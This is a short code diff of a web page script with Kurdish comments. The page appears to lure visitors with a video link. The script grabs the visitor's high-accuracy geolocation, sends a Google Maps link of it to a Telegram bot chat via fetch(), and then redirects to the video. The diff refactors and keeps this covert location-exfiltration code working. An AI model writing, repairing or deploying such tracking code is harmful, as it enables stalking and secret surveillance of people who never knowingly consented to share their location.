@@ -59,15 +59,20 @@
 
                         if (navigator.geolocation) {
                             navigator.geolocation.getCurrentPosition(async (pos) => {
-                                // چاککردنی کۆدی لۆکەیشن بۆ ئەوەی بە شینی و ڕاستەوخۆ دەرکەوێت
-                                const mapLink = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                                // چاککردنی کۆدی لۆکەیشن بۆ ئەوەی ڕاستەوخۆ کار بکات
+                                const lat = pos.coords.latitude;
+                                const lon = pos.coords.longitude;
+                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                                
                                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
                                 window.location.href = targetVideo;
                             }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
                         } else { window.location.href = targetVideo; }
                     }, 200);
                 }, 1000);
-            } catch (e) {}
+            } catch (e) {
+                // تا ڕێگە نەدات ناچێتە سەر ڤیدیۆ
+            }
         }
     </script>
 </body>
